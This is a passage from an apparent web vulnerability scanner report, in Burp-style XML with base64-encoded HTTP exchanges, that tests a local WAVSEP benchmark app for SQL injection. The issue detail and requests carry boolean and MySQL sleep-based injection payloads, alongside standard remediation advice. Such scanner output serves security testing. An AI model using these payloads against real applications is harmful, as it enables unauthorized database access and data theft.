      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9MTUwNjU3NTk4JTIwb3IlMjA5Njk0JTNkMDk2OTQ=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzIKPC9URD4KPFREPgoxMDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9MTcyMzczMTY2JTIwb3IlMjA4MTAzJTNkODExMA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2259480204105958400</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>77204439 or 2937=02937</b> and <b>58708084 or 4026=4035</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dJZD0xNzcyMDQ0MzklMjBvciUyMDI5MzclM2QwMjkzNw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NDINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMQo8L1REPgo8VEQ+CldlbGNvbWUgdG8gdGhlIHdlYiBzaXRlCjwvVEQ+CjxURD4KdGV4dHZhbHVlCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dJZD0xNTg3MDgwODQlMjBvciUyMDQwMjYlM2Q0MDM1]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2V